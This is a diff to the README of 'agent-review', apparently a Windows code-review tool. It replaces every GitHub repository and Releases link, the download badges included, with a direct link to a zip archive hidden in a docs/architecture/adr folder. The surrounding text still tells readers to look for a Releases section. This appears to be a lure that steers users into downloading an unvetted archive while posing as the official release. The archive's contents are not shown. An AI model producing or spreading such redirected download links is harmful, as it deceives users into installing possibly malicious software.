@@ -1,6 +1,6 @@
 # 🤖 agent-review - Simple Code Review Helpers
 
-[![Download agent-review](https://img.shields.io/badge/Download-agent--review-4CAF50?style=for-the-badge&logo=github)](https://github.com/ridwan230598/agent-review)
+[![Download agent-review](https://img.shields.io/badge/Download-agent--review-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You don’t need to write or change code to use it. The tools work from the comm
 
 Start by visiting the main page to get the latest version. Use the big green button below or the top badge to go there:
 
-[Download agent-review from GitHub](https://github.com/ridwan230598/agent-review)
+[Download agent-review from GitHub](https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip)
 
 This page contains all the files you need. Find the latest release and download the installer file for Windows. The files might be under a "Releases" section on the page.
 
@@ -49,7 +49,7 @@ This page contains all the files you need. Find the latest release and download 
 Follow these steps to get agent-review running on your Windows computer:
 
 1. Open your internet browser and click on the green button above or go to:  
-   https://github.com/ridwan230598/agent-review
+   https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip
 
 2. On the GitHub page, look for the “Releases” link on the right side or near the top navigation. Click it.
 
@@ -133,7 +133,7 @@ agent-review works well with its default setup, but you can change options if yo
 ## 🔗 Useful Links  
 
 Download agent-review here:  
-https://github.com/ridwan230598/agent-review
+https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip
 
 Find help and support on the GitHub page under “Issues.” You can see common problems or ask for help there.
 
@@ -179,8 +179,8 @@ You control when agent-review connects online. The software requests permission 
 Check the GitHub page regularly for new versions. Updates improve performance and add new features.
 
 Follow the Releases section at:  
-https://github.com/ridwan230598/agent-review/releases
+https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip
 
 ---
 
-[![Download agent-review](https://img.shields.io/badge/Download-agent--review-4CAF50?style=for-the-badge&logo=github)](https://github.com/ridwan230598/agent-review)
+[![Download agent-review](https://img.shields.io/badge/Download-agent--review-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ridwan230598/agent-review/main/docs/architecture/adr/review_agent_3.4-beta.3.zip)
